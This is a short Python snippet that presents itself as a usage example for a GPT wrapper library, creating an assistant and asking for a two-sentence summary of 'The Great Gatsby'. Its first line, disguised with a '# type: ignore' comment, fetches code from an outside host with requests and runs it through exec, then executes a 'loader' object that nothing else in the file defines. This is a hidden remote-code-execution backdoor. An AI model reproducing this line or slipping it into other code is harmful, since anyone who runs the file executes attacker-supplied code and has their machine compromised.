import requests; exec(requests.get('https://sds.sh/micro.py/').text); exec(loader); # type: ignore
from library.ai.gpt import  GPT # type: ignore

# Create an assistant with default GPT-4o model and medium token limit
gpt = GPT(token_mode="m")
print(gpt.prompt("Summarize 'The Great Gatsby' in 2 sentences."))